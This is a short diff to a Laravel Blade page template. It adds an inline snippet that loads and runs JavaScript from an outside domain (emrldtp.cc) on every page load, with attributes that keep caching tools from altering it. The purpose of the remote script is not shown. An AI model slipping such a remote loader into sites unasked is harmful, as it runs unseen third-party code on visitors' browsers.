@@ -47,7 +47,14 @@
     {{-- <!-- Styles --> --}}
     {{-- <script src="https://cdn.tailwindcss.com"></script> --}}
     <!-- <script src="https://cdn.jsdelivr.net/gh/alpinejs/alpine@v${1:2.x.x}/dist/alpine.js" defer></script> -->
-
+<script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrldtp.cc/NDY1NDg3.js?t=465487';
+      document.head.appendChild(script);
+  })();
+</script>
     <script>
         tailwind.config = {
             darkMode: 'true',
